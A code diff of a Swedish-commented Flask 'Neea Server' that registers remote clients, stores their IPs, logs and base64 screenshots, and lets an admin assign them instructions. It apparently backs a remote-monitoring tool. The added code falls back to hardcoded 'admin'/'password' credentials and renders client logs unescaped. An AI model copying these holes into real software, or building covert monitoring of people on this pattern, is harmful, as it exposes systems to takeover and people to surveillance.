-def api_update_instruction():
-    """API-endpunkt för att uppdatera en klients instruktion."""
-    logging.debug(f"Uppdateringsinstruktionsförfrågan från {request.remote_addr} med data: {request.get_data(as_text=True)}")
-    logging.info(f"Uppdateringsinstruktionsförfrågan från {request.remote_addr}")
-    try:
-        if request.is_json:
-            data = request.get_json()
-            client_id = data.get("client_id")
-            instruction = data.get("instruction")
-        else:
-            client_id = request.form.get("client_id")
-            instruction = request.form.get("instruction")
-        logging.debug(f"Parsad data - client_id: {client_id}, instruktion: {instruction}")
-            
-        if not client_id or not instruction:
-            logging.warning("Ogiltig instruktionsuppdateringsförfrågan: Saknar client_id eller instruktion")
-            return jsonify({"status": "error", "message": "Klient-ID och instruktion krävs"}), 400
-            
-        if instruction not in INSTRUCTIONS:
-            logging.warning(f"Ogiltig instruktionstyp begärd: {instruction}")
-            return jsonify({"status": "error", "message": "Ogiltig instruktionstyp"}), 400
-        
-        success = update_client_instruction(client_id, instruction)
-        if success:
-            logging.info(f"Instruktion uppdaterad framgångsrikt för klient {client_id}: {instruction}")
-            return jsonify({"status": "success"})
-        else:
-            logging.warning(f"Misslyckades med att uppdatera instruktion för klient {client_id}")
-            return jsonify({"status": "error", "message": "Misslyckades med att uppdatera instruktion"}), 500
-    except Exception as e:
-        logging.error(f"Fel vid uppdatering av instruktion: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return jsonify({"status": "error", "message": f"Fel vid uppdatering av instruktion: {str(e)}"}), 500
-
-@app.route("/api/clear_logs", methods=["POST"])
-def api_clear_logs():
-    """API-endpunkt för att rensa en klients loggar."""
-    logging.debug(f"Rensa loggförfrågan från {request.remote_addr} med data: {request.get_data(as_text=True)}")
-    logging.info(f"Rensa loggförfrågan från {request.remote_addr}")
-    try:
-        if request.is_json:
-            data = request.get_json()
-        else:
-            data = {key: request.form[key] for key in request.form}
-        logging.debug(f"Parsad data: {data}")
-            
-        if not data:
-            logging.error("Ogiltig data i rensa loggförfrågan")
-            return jsonify({"status": "error", "message": "Ogiltigt förfrågningsformat"}), 400
-            
-        client_id = data.get("client_id")
-        if not client_id:
-            logging.warning("Ogiltig rensa loggförfrågan: Saknar client_id")
-            return jsonify({"status": "error", "message": "Klient-ID krävs"}), 400
-    except Exception as e:
-        logging.error(f"Fel vid parsning av rensa loggförfrågan: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return jsonify({"status": "error", "message": f"Ogiltigt förfrågningsformat: {str(e)}"}), 400
-    
-    try:
-        success = clear_client_logs(client_id)
-        if success:
-            logging.info(f"Loggar rensade framgångsrikt för klient {client_id}")
-            return jsonify({"status": "success", "message": "Loggar rensade framgångsrikt"})
-        else:
-            logging.warning(f"Misslyckades med att rensa loggar för klient {client_id}")
-            return jsonify({"status": "error", "message": "Misslyckades med att rensa loggar"}), 500
-    except Exception as e:
-        logging.error(f"Fel vid rensning av loggar för klient {client_id}: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return jsonify({"status": "error", "message": f"Fel vid rensning av loggar: {str(e)}"}), 500
-
-@app.route("/api/export_logs", methods=["POST"])
-def api_export_logs():
-    """API-endpunkt för att exportera en klients loggar."""
-    logging.debug(f"Exportera loggförfrågan från {request.remote_addr} med data: {request.get_data(as_text=True)}")
-    logging.info(f"Exportera loggförfrågan från {request.remote_addr}")
-    try:
-        if request.is_json:
-            data = request.get_json()
-        else:
-            data = {key: request.form[key] for key in request.form}
-        logging.debug(f"Parsad data: {data}")
-            
-        if not data:
-            logging.error("Ogiltig data i exportera loggförfrågan")
-            return jsonify({"status": "error", "message": "Ogiltigt förfrågningsformat"}), 400
-            
-        client_id = data.get("client_id")
-        if not client_id:
-            logging.warning("Ogiltig exportera loggförfrågan: Saknar client_id")
-            return jsonify({"status": "error", "message": "Klient-ID krävs"}), 400
-    except Exception as e:
-        logging.error(f"Fel vid parsning av exportera loggförfrågan: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return jsonify({"status": "error", "message": f"Ogiltigt förfrågningsformat: {str(e)}"}), 400
-    
-    log_file = os.path.join(CLIENT_LOGS_DIRECTORY, f"{client_id}.log")
-    if not os.path.exists(log_file):
-        try:
-            os.makedirs(os.path.dirname(log_file), exist_ok=True)
-            logging.debug(f"Skapar tom loggfil på {log_file}")
-            with open(log_file, 'w', encoding='utf-8') as f:
-                f.write(f"Loggfil skapad: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                f.write("Inga loggar tillgängliga än\n")
-                f.write("-" * 50 + "\n\n")
-            logging.info(f"Skapade tom loggfil för klient {client_id}")
-        except Exception as e:
-            logging.error(f"Fel vid skapande av loggfil för klient {client_id}: {e}")
-            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-            return jsonify({"status": "error", "message": "Misslyckades med att skapa loggfil"}), 500
-    
-    try:
-        memory_file = io.BytesIO()
-        with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
-            try:
-                with open(log_file, 'r', encoding='utf-8', errors='replace') as f:
-                    log_content = f.read()
-                logging.debug(f"Läste logginnehåll från {log_file}, längd: {len(log_content)}")
-                zf.writestr(f"{client_id}_logs.txt", log_content)
-            except Exception as e:
-                logging.error(f"Fel vid läsning av loggfil: {e}")
-                logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-                zf.writestr(f"{client_id}_error.txt", f"Fel vid läsning av loggfil: {str(e)}")
-                
-        memory_file.seek(0)
-        logging.debug(f"Förberedde zip-fil för nedladdning, storlek: {memory_file.getbuffer().nbytes} byte")
-        return send_file(
-            memory_file,
-            mimetype='application/zip',
-            as_attachment=True,
-            download_name=f"{client_id}_logs.zip"
-        )
-    except Exception as e:
-        logging.error(f"Fel vid export av loggar för klient {client_id}: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return jsonify({"status": "error", "message": f"Fel vid export av loggar: {str(e)}"}), 500
-
-@app.route("/api/get_screenshots", methods=["GET"])
-def api_get_screenshots():
-    """API-endpunkt för att hämta tagna skärmdumpar med ytterligare metadata."""
-    logging.debug(f"Hämta skärmdumpförfrågan från {request.remote_addr}")
-    logging.info(f"Hämta skärmdumpförfrågan från {request.remote_addr}")
-    try:
-        if os.path.exists(SCREENSHOTS_FILE):
-            with open(SCREENSHOTS_FILE, "r", encoding="utf-8") as sf:
-                screenshots_data = json.load(sf)
-            logging.debug(f"Laddade skärmdumpdata med {len(screenshots_data)} poster")
-                
-            enhanced_screenshots = []
-            for idx, entry in enumerate(screenshots_data):
-                client_id = sanitize_filename(entry.get("user", "unknown"))
-                enhanced_screenshots.append({
-                    "id": idx,
-                    "timestamp": entry.get("timestamp", "Okänd"),
-                    "client_id": client_id,
-                    "client_name": entry.get("user", "Okänd"),
-                    "system": entry.get("system", "Okänd"),
-                    "data": entry.get("data", "")
-                })
-            logging.debug(f"Förberedde {len(enhanced_screenshots)} förbättrade skärmdumpposter")
-                
-            return jsonify({"status": "success", "screenshots": enhanced_screenshots})
-        else:
-            logging.warning("Skärmdumpfilen hittades inte")
-            return jsonify({"status": "success", "screenshots": []})
-    except Exception as e:
-        logging.error(f"Fel vid hämtning av skärmdumpar: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return jsonify({"status": "error", "message": f"Fel vid hämtning av skärmdumpar: {str(e)}"}), 500
-
-@app.route("/api/download_screenshot/<int:screenshot_id>", methods=["GET"])
-def api_download_screenshot(screenshot_id):
-    """API-endpunkt för att ladda ner en specifik skärmdump."""
-    logging.debug(f"Ladda ner skärmdumpförfrågan från {request.remote_addr} för ID {screenshot_id}")
-    logging.info(f"Ladda ner skärmdumpförfrågan från {request.remote_addr} för ID {screenshot_id}")
-    try:
-        if os.path.exists(SCREENSHOTS_FILE):
-            with open(SCREENSHOTS_FILE, "r", encoding="utf-8") as sf:
-                screenshots_data = json.load(sf)
-            logging.debug(f"Laddade skärmdumpdata med {len(screenshots_data)} poster")
-                
-            if 0 <= screenshot_id < len(screenshots_data):
-                screenshot = screenshots_data[screenshot_id]
-                base64_data = screenshot.get("data", "")
-                timestamp = screenshot.get("timestamp", "okänd_tid").replace(" ", "_").replace(":", "-")
-                client_name = sanitize_filename(screenshot.get("user", "unknown"))
-                logging.debug(f"Förbereder skärmdump - klient: {client_name}, tidsstämpel: {timestamp}, datalängd: {len(base64_data)}")
-                
-                filename = f"skärmdump_{client_name}_{timestamp}.png"
-                binary_data = base64.b64decode(base64_data)
-                memory_file = io.BytesIO(binary_data)
-                memory_file.seek(0)
-                logging.debug(f"Avkodade Base64-data, filstorlek: {memory_file.getbuffer().nbytes} byte")
-                
-                return send_file(
-                    memory_file,
-                    mimetype='image/png',
-                    as_attachment=True,
-                    download_name=filename
-                )
-            else:
-                logging.warning(f"Skärmdump-ID {screenshot_id} utanför intervallet")
-                return jsonify({"status": "error", "message": "Skärmdumpen hittades inte"}), 404
-        else:
-            logging.warning("Skärmdumpfilen hittades inte")
-            return jsonify({"status": "error", "message": "Inga skärmdumpar tillgängliga"}), 404
-    except Exception as e:
-        logging.error(f"Fel vid nedladdning av skärmdump: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-        return jsonify({"status": "error", "message": f"Fel vid nedladdning av skärmdump: {str(e)}"}), 500
-
-@app.route("/api/get_client_details/<client_id>", methods=["GET"])
-def get_client_details(client_id):
-    """API-endpunkt för att hämta detaljerad klientinformation."""
-    logging.debug(f"Hämta klientdetaljer för {client_id} från {request.remote_addr}")
-    if not client_id:
-        logging.warning("Klient-ID krävs men angavs inte")
-        return jsonify({"status": "error", "message": "Klient-ID krävs"}), 400
-
-    client_index = {}
-    if os.path.exists(INDEX_FILE):
-        try:
-            logging.debug(f"Laddar client_index från {INDEX_FILE}")
-            with open(INDEX_FILE, "r", encoding="utf-8") as f:
-                client_index = json.load(f) or {}
-            logging.debug(f"Laddade client_index med {len(client_index)} klienter")
-        except Exception as e:
-            logging.error(f"Fel vid läsning av client_index.json: {e}")
-            logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-            return jsonify({"status": "error", "message": "Kunde inte ladda klientindex"}), 500
-
-    if client_id in client_index:
-        logging.debug(f"Returnerar detaljer för klient {client_id}: {client_index[client_id]}")
-        return jsonify({"status": "success", "client_details": client_index[client_id]})
-    else:
-        logging.warning(f"Klient {client_id} hittades inte")
-        return jsonify({"status": "error", "message": "Klienten hittades inte"}), 404
-
 def get_admin_credentials():
-    """Hämtar aktuella adminuppgifter eller returnerar standardvärden."""
-    logging.debug("Hämtar adminuppgifter")
+    """Hämtar admin-inloggningsuppgifter."""
     try:
         if os.path.exists(ADMIN_CREDENTIALS_FILE):
             with open(ADMIN_CREDENTIALS_FILE, "r", encoding="utf-8") as f:
-                creds = json.load(f)
-            logging.debug(f"Laddade uppgifter: {creds}")
-            return creds.get("username", DEFAULT_ADMIN_USERNAME), creds.get("password", DEFAULT_ADMIN_PASSWORD)
+                data = json.load(f)
+                return data.get("username"), data.get("password")
         else:
-            logging.info("Adminuppgiftsfilen hittades inte. Skapar med standardvärden.")
-            set_admin_credentials(DEFAULT_ADMIN_USERNAME, DEFAULT_ADMIN_PASSWORD)
+            # Default credentials if no file exists
+            return "admin", "password"
     except Exception as e:
-        logging.error(f"Fel i get_admin_credentials: {e}")
-        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
-    
-    logging.debug(f"Returnerar standarduppgifter: {DEFAULT_ADMIN_USERNAME}")
-    return DEFAULT_ADMIN_USERNAME, DEFAULT_ADMIN_PASSWORD
+        logging.error(f"Fel vid hämtning av admininloggningsuppgifter: {e}")
+        return "admin", "password"  # Default if error
 
 def set_admin_credentials(username, password):
     """Sparar nya adminuppgifter."""
@@ -972,6 +83,1156 @@ def set_admin_credentials(username, password):
         logging.error(f"Fel vid sparande av adminuppgifter: {e}")
         logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
         return False
+
+def is_client_active(last_activity_str):
+    """Kontrollerar om en klient är aktiv baserat på senaste aktivitet."""
+    try:
+        if not last_activity_str:
+            return False
+        
+        last_activity = datetime.strptime(last_activity_str, "%Y-%m-%d %H:%M:%S")
+        now = datetime.now()
+        return (now - last_activity) < timedelta(minutes=ONLINE_THRESHOLD_MINUTES)
+    except Exception as e:
+        logging.error(f"Fel vid kontroll av klientaktivitet: {e}")
+        return False
+
+def update_ping_status(client_id, status):
+    """Uppdaterar ping-status för en klient."""
+    try:
+        client_index = {}
+        if os.path.exists(INDEX_FILE):
+            with open(INDEX_FILE, "r", encoding="utf-8") as f:
+                client_index = json.load(f)
+                
+        if client_id in client_index:
+            client_index[client_id]["ping_status"] = status
+            client_index[client_id]["last_ping"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            
+            with open(INDEX_FILE, "w", encoding="utf-8") as f:
+                json.dump(client_index, f, indent=4)
+            logging.debug(f"Uppdaterade pingstatus för klient {client_id} till {status}")
+            return True
+        return False
+    except Exception as e:
+        logging.error(f"Fel vid uppdatering av pingstatus: {e}")
+        return False
+
+def sort_log_entries(log_content, sort_order="newest"):
+    """Sorterar logginlägg efter tidstämpel."""
+    try:
+        lines = log_content.strip().split("\n")
+        sorted_lines = []
+
+        # Analysera och sortera
+        for line in lines:
+            try:
+                timestamp_str = line.split("[")[0].strip()
+                datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
+                sorted_lines.append((timestamp_str, line))
+            except (ValueError, IndexError):
+                # Om raden inte har ett giltigt tidsstämplingsformat, lägg den längst ner
+                sorted_lines.append(("0001-01-01 00:00:00", line))
+
+        # Sortera efter tidsstämpel
+        sorted_lines.sort(key=lambda x: x[0], reverse=(sort_order == "newest"))
+        
+        return "\n".join([line for _, line in sorted_lines])
+    except Exception as e:
+        logging.error(f"Fel vid sortering av logginlägg: {e}")
+        # Returnera original vid fel
+        return log_content
+
+def install_static_files():
+    """Installerar statiska filer om de saknas."""
+    try:
+        if not os.path.exists(TEMPLATES_DIRECTORY):
+            os.makedirs(TEMPLATES_DIRECTORY, exist_ok=True)
+            logging.info(f"Skapade mallkatalog: {TEMPLATES_DIRECTORY}")
+            
+        # Skapa grundläggande mallfiler om de saknas
+        for template_name, template_content in {
+            "login.html": """
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Neea Server - Login</title>
+                <link rel="stylesheet" href="/static/style.css">
+            </head>
+            <body>
+                <div class="login-container">
+                    <h1>Neea Server</h1>
+                    <form method="post">
+                        <div class="form-group">
+                            <label for="username">Användarnamn:</label>
+                            <input type="text" id="username" name="username" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="password">Lösenord:</label>
+                            <input type="password" id="password" name="password" required>
+                        </div>
+                        {% if error %}
+                        <div class="error">{{ error }}</div>
+                        {% endif %}
+                        <button type="submit">Logga in</button>
+                    </form>
+                </div>
+            </body>
+            </html>
+            """,
+            "viewer.html": """
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Neea Server - Client Viewer</title>
+                <link rel="stylesheet" href="/static/style.css">
+                <script src="/static/script.js"></script>
+            </head>
+            <body>
+                <div class="container">
+                    <header>
+                        <h1>Neea Client Viewer</h1>
+                        <div class="header-actions">
+                            <a href="{{ url_for('viewer') }}?logout=1" class="btn btn-logout">Logga ut</a>
+                        </div>
+                    </header>
+                    <div class="dashboard">
+                        <div class="widget">
+                            <div class="widget-title">Totalt antal klienter</div>
+                            <div class="widget-value">{{ total_clients }}</div>
+                        </div>
+                        <div class="widget">
+                            <div class="widget-title">Aktiva klienter</div>
+                            <div class="widget-value">{{ active_clients }}</div>
+                        </div>
+                        <div class="widget">
+                            <div class="widget-title">Totalt antal loggar</div>
+                            <div class="widget-value">{{ total_logs }}</div>
+                        </div>
+                        <div class="widget">
+                            <div class="widget-title">Lagring använd</div>
+                            <div class="widget-value">{{ storage_used }}</div>
+                        </div>
+                        <div class="widget">
+                            <div class="widget-title">Senaste aktivitet</div>
+                            <div class="widget-value">{{ latest_activity }}</div>
+                        </div>
+                    </div>
+                    <div class="main-content">
+                        <div class="sidebar">
+                            <h2>Klienter</h2>
+                            <div class="client-list">
+                                {% for client in sorted_clients %}
+                                <a href="{{ url_for('viewer') }}?client={{ client.id }}" class="client-item {% if client.id == selected_client %}active{% endif %} {% if client.is_active %}online{% else %}offline{% endif %}">
+                                    <div class="client-name">{{ client.name }}</div>
+                                    <div class="client-info">{{ client.os }}</div>
+                                    <div class="client-status">{{ "Online" if client.is_active else "Offline" }}</div>
+                                </a>
+                                {% else %}
+                                <div class="no-clients">Inga klienter registrerade</div>
+                                {% endfor %}
+                            </div>
+                        </div>
+                        <div class="content">
+                            {% if selected_client %}
+                            <div class="client-details">
+                                <h2>Klientinformation</h2>
+                                <div class="client-info-grid">
+                                    <div class="info-item">
+                                        <div class="info-label">Klient-ID</div>
+                                        <div class="info-value">{{ selected_client }}</div>
+                                    </div>
+                                    <div class="info-item">
+                                        <div class="info-label">Namn</div>
+                                        <div class="info-value">{{ client_info.name }}</div>
+                                    </div>
+                                    <div class="info-item">
+                                        <div class="info-label">OS</div>
+                                        <div class="info-value">{{ client_info.os }}</div>
+                                    </div>
+                                    <div class="info-item">
+                                        <div class="info-label">Status</div>
+                                        <div class="info-value status-{{ 'online' if client_info.is_active else 'offline' }}">
+                                            {{ "Online" if client_info.is_active else "Offline" }}
+                                        </div>
+                                    </div>
+                                    <div class="info-item">
+                                        <div class="info-label">Senaste aktivitet</div>
+                                        <div class="info-value">{{ client_info.last_activity }}</div>
+                                    </div>
+                                    <div class="info-item">
+                                        <div class="info-label">IP-adress</div>
+                                        <div class="info-value">{{ client_info.ip }}</div>
+                                    </div>
+                                    <div class="info-item">
+                                        <div class="info-label">Publik IP</div>
+                                        <div class="info-value">{{ client_info.public_ip }}</div>
+                                    </div>
+                                    <div class="info-item">
+                                        <div class="info-label">Instruktion</div>
+                                        <div class="info-value">{{ client_info.instruction }}</div>
+                                    </div>
+                                </div>
+
+                                <div class="client-actions">
+                                    <h3>Åtgärder</h3>
+                                    <div class="action-buttons">
+                                        <a href="#" class="btn" onclick="pingClient('{{ selected_client }}'); return false;">Ping</a>
+                                        <a href="#" class="btn" onclick="clearLogs('{{ selected_client }}'); return false;">Rensa loggar</a>
+                                        
+                                        <form class="instruction-form">
+                                            <select id="instruction-select">
+                                                {% for inst_type in instruction_types %}
+                                                <option value="{{ inst_type }}" {% if client_info.instruction == inst_type %}selected{% endif %}>{{ inst_type }}</option>
+                                                {% endfor %}
+                                            </select>
+                                            <button type="button" onclick="setInstruction('{{ selected_client }}'); return false;" class="btn">Uppdatera instruktion</button>
+                                        </form>
+                                    </div>
+                                </div>
+
+                                <div class="log-section">
+                                    <div class="log-header">
+                                        <h3>Loggar</h3>
+                                        <div class="log-filter">
+                                            <label for="sort-order">Sortera:</label>
+                                            <select id="sort-order" onchange="changeSortOrder('{{ selected_client }}', this.value)">
+                                                <option value="newest" {% if sort_order == 'newest' %}selected{% endif %}>Nyast först</option>
+                                                <option value="oldest" {% if sort_order == 'oldest' %}selected{% endif %}>Äldst först</option>
+                                            </select>
+                                        </div>
+                                    </div>
+                                    <div class="log-viewer" id="log-content">
+                                        {{ log_content|safe }}
+                                    </div>
+                                </div>
+                            </div>
+                            {% else %}
+                            <div class="no-selection">
+                                <h2>Ingen klient vald</h2>
+                                <p>Välj en klient från listan för att visa information och loggar.</p>
+                            </div>
+                            {% endif %}
+                        </div>
+                    </div>
+                </div>
+            </body>
+            </html>
+            """
+        }.items():
+            template_path = os.path.join(TEMPLATES_DIRECTORY, template_name)
+            if not os.path.exists(template_path):
+                with open(template_path, "w", encoding="utf-8") as f:
+                    f.write(template_content)
+                logging.info(f"Skapade mall: {template_name}")
+        
+        # Skapa CSS och JS-filer om de saknas
+        if not os.path.exists(STATIC_DIRECTORY):
+            os.makedirs(STATIC_DIRECTORY, exist_ok=True)
+            logging.info(f"Skapade statisk katalog: {STATIC_DIRECTORY}")
+            
+        for static_file, static_content in {
+            "style.css": """
+            /* Grundläggande stilar */
+            body {
+                font-family: Arial, sans-serif;
+                margin: 0;
+                padding: 0;
+                background-color: #f5f5f5;
+                color: #333;
+            }
+            
+            .container {
+                max-width: 1200px;
+                margin: 0 auto;
+                padding: 20px;
+            }
+            
+            header {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                padding: 10px 0;
+                border-bottom: 1px solid #ddd;
+                margin-bottom: 20px;
+            }
+            
+            h1, h2, h3 {
+                margin-top: 0;
+            }
+            
+            /* Login */
+            .login-container {
+                max-width: 400px;
+                margin: 100px auto;
+                padding: 20px;
+                background-color: white;
+                border-radius: 8px;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            }
+            
+            .form-group {
+                margin-bottom: 15px;
+            }
+            
+            label {
+                display: block;
+                margin-bottom: 5px;
+            }
+            
+            input[type="text"],
+            input[type="password"],
+            select {
+                width: 100%;
+                padding: 8px;
+                border: 1px solid #ddd;
+                border-radius: 4px;
+            }
+            
+            .error {
+                color: red;
+                margin: 10px 0;
+            }
+            
+            /* Knappar */
+            .btn {
+                display: inline-block;
+                padding: 8px 15px;
+                background-color: #4CAF50;
+                color: white;
+                border: none;
+                border-radius: 4px;
+                cursor: pointer;
+                text-decoration: none;
+                font-size: 14px;
+            }
+            
+            .btn:hover {
+                background-color: #45a049;
+            }
+            
+            .btn-logout {
+                background-color: #f44336;
+            }
+            
+            .btn-logout:hover {
+                background-color: #d32f2f;
+            }
+            
+            /* Dashboard widgets */
+            .dashboard {
+                display: flex;
+                flex-wrap: wrap;
+                gap: 20px;
+                margin-bottom: 20px;
+            }
+            
+            .widget {
+                flex: 1;
+                min-width: 200px;
+                background-color: white;
+                padding: 15px;
+                border-radius: 8px;
+                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            }
+            
+            .widget-title {
+                font-size: 14px;
+                color: #666;
+                margin-bottom: 5px;
+            }
+            
+            .widget-value {
+                font-size: 24px;
+                font-weight: bold;
+            }
+            
+            /* Huvudinnehåll */
+            .main-content {
+                display: flex;
+                gap: 20px;
+            }
+            
+            .sidebar {
+                width: 300px;
+                background-color: white;
+                padding: 15px;
+                border-radius: 8px;
+                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            }
+            
+            .content {
+                flex: 1;
+                background-color: white;
+                padding: 20px;
+                border-radius: 8px;
+                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            }
+            
+            /* Klientlista */
+            .client-list {
+                max-height: 500px;
+                overflow-y: auto;
+            }
+            
+            .client-item {
+                display: block;
+                padding: 10px;
+                margin-bottom: 5px;
+                border-radius: 4px;
+                text-decoration: none;
+                color: #333;
+                border-left: 4px solid transparent;
+            }
+            
+            .client-item:hover {
+                background-color: #f0f0f0;
+            }
+            
+            .client-item.active {
+                background-color: #e6f7ff;
+                border-left-color: #1890ff;
+            }
+            
+            .client-item.online {
+                border-left-color: #52c41a;
+            }
+            
+            .client-item.offline {
+                border-left-color: #f5222d;
+            }
+            
+            .client-name {
+                font-weight: bold;
+                margin-bottom: 5px;
+            }
+            
+            .client-info {
+                font-size: 12px;
+                color: #666;
+                margin-bottom: 5px;
+            }
+            
+            .client-status {
+                font-size: 12px;
+                display: inline-block;
+                padding: 2px 6px;
+                border-radius: 10px;
+                background-color: #f0f0f0;
+            }
+            
+            .client-item.online .client-status {
+                background-color: #f6ffed;
+                color: #52c41a;
+            }
+            
+            .client-item.offline .client-status {
+                background-color: #fff1f0;
+                color: #f5222d;
+            }
+            
+            .no-clients {
+                color: #999;
+                padding: 20px;
+                text-align: center;
+            }
+            
+            /* Klientinformation */
+            .client-info-grid {
+                display: grid;
+                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+                gap: 15px;
+                margin-bottom: 20px;
+            }
+            
+            .info-item {
+                border: 1px solid #eee;
+                padding: 10px;
+                border-radius: 4px;
+            }
+            
+            .info-label {
+                font-size: 12px;
+                color: #666;
+                margin-bottom: 5px;
+            }
+            
+            .info-value {
+                font-weight: bold;
+            }
+            
+            .status-online {
+                color: #52c41a;
+            }
+            
+            .status-offline {
+                color: #f5222d;
+            }
+            
+            /* Loggvisare */
+            .log-section {
+                margin-top: 20px;
+            }
+            
+            .log-header {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                margin-bottom: 10px;
+            }
+            
+            .log-filter {
+                display: flex;
+                align-items: center;
+                gap: 10px;
+            }
+            
+            .log-viewer {
+                background-color: #2c2c2c;
+                color: #f0f0f0;
+                padding: 15px;
+                border-radius: 4px;
+                font-family: monospace;
+                white-space: pre-wrap;
+                overflow-x: auto;
+                height: 400px;
+                overflow-y: auto;
+            }
+            
+            /* Klientåtgärder */
+            .client-actions {
+                margin: 20px 0;
+            }
+            
+            .action-buttons {
+                display: flex;
+                gap: 10px;
+                flex-wrap: wrap;
+                align-items: center;
+            }
+            
+            .instruction-form {
+                display: flex;
+                gap: 10px;
+                align-items: center;
+            }
+            
+            /* Ingen val-meddelande */
+            .no-selection {
+                text-align: center;
+                padding: 50px 0;
+                color: #999;
+            }
+            """,
+            "script.js": """
+            // Function to ping a client
+            function pingClient(clientId) {
+                if (!clientId) return;
+                
+                fetch(`/api/ping_client/${clientId}`, {
+                    method: 'POST'
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        alert('Ping skickad till klienten');
+                        // Uppdatera sidan för att visa den senaste pingstatus
+                        window.location.reload();
+                    } else {
+                        alert('Fel vid ping av klienten: ' + data.message);
+                    }
+                })
+                .catch(error => {
+                    alert('Fel vid kommunikation med servern: ' + error);
+                });
+            }
+            
+            // Function to clear logs for a client
+            function clearLogs(clientId) {
+                if (!clientId || !confirm('Är du säker på att du vill rensa loggarna för denna klient?')) return;
+                
+                fetch(`/api/clear_logs/${clientId}`, {
+                    method: 'POST'
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        alert('Loggar rensade');
+                        // Uppdatera loggvisaren
+                        document.getElementById('log-content').innerHTML = '<span style="color:orange">Loggarna har rensats.</span>';
+                    } else {
+                        alert('Fel vid rensning av loggar: ' + data.message);
+                    }
+                })
+                .catch(error => {
+                    alert('Fel vid kommunikation med servern: ' + error);
+                });
+            }
+            
+            // Function to change the sort order of logs
+            function changeSortOrder(clientId, sortOrder) {
+                if (!clientId) return;
+                
+                // Uppdatera URL med ny sorteringsordning
+                const url = new URL(window.location.href);
+                url.searchParams.set('sort', sortOrder);
+                
+                // Hämta bara logginnehåll
+                fetch(`${url.pathname}?client=${clientId}&sort=${sortOrder}&partial=1`)
+                .then(response => response.text())
+                .then(html => {
+                    document.getElementById('log-content').innerHTML = html;
+                })
+                .catch(error => {
+                    alert('Fel vid hämtning av sorterade loggar: ' + error);
+                });
+            }
+            
+            // Function to set instruction for a client
+            function setInstruction(clientId) {
+                if (!clientId) return;
+                
+                const instruction = document.getElementById('instruction-select').value;
+                
+                fetch(`/api/set_instruction/${clientId}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ instruction: instruction })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        alert(`Instruktion satt till: ${instruction}`);
+                        // Uppdatera sidan för att visa den nya instruktionen
+                        window.location.reload();
+                    } else {
+                        alert('Fel vid inställning av instruktion: ' + data.message);
+                    }
+                })
+                .catch(error => {
+                    alert('Fel vid kommunikation med servern: ' + error);
+                });
+            }
+            
+            // Initialize on page load
+            document.addEventListener('DOMContentLoaded', function() {
+                console.log('Viewer page loaded');
+            });
+            """
+        }.items():
+            static_path = os.path.join(STATIC_DIRECTORY, static_file)
+            if not os.path.exists(static_path):
+                with open(static_path, "w", encoding="utf-8") as f:
+                    f.write(static_content)
+                logging.info(f"Skapade statisk fil: {static_file}")
+                
+        logging.info("Statiska filer installerade")
+    except Exception as e:
+        logging.error(f"Fel vid installation av statiska filer: {e}")
+        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
+
+@app.route("/api/register", methods=["POST"])
+def api_register():
+    """API för klientregistrering."""
+    client_data = {}
+    ip_address = request.remote_addr
+    
+    logging.debug(f"Registreringsförfrågan från {ip_address} med data: {request.get_data(as_text=True)}")
+    
+    try:
+        if request.is_json:
+            client_data = request.get_json()
+        else:
+            # Försök att parsa form data
+            client_data = request.form.to_dict()
+        
+        # Verifiera nödvändig data
+        if not client_data or not client_data.get("id"):
+            logging.warning(f"Ogiltig registreringsförfrågan från {ip_address}: Inget ID tillhandahållet")
+            return jsonify({"status": "error", "message": "Client ID krävs"}), 400
+        
+        client_id = client_data.get("id")
+        logging.info(f"Registrerar klient {client_id} från IP {ip_address}")
+        
+        # Säkerställ att loggkataloger finns
+        os.makedirs(CLIENT_LOGS_DIRECTORY, exist_ok=True)
+        os.makedirs(os.path.dirname(INDEX_FILE), exist_ok=True)
+        
+        # Läs befintligt index om det finns
+        client_index = {}
+        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
+            try:
+                with open(INDEX_FILE, "r", encoding="utf-8") as f:
+                    client_index = json.load(f) or {}
+            except Exception as e:
+                logging.error(f"Fel vid läsning av client_index.json: {e}")
+                client_index = {}
+        
+        # Skapa eller uppdatera klientdata
+        if client_id in client_index:
+            logging.info(f"Uppdaterar befintlig klient {client_id}")
+            # Bevara vissa befintliga värden
+            existing_data = client_index[client_id]
+            # Uppdatera med ny data
+            for key, value in client_data.items():
+                # Uppdatera bara specifika fält, behåll annat
+                if key not in ["last_activity", "first_seen"]:
+                    existing_data[key] = value
+            # Uppdatera aktivitetstid
+            existing_data["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
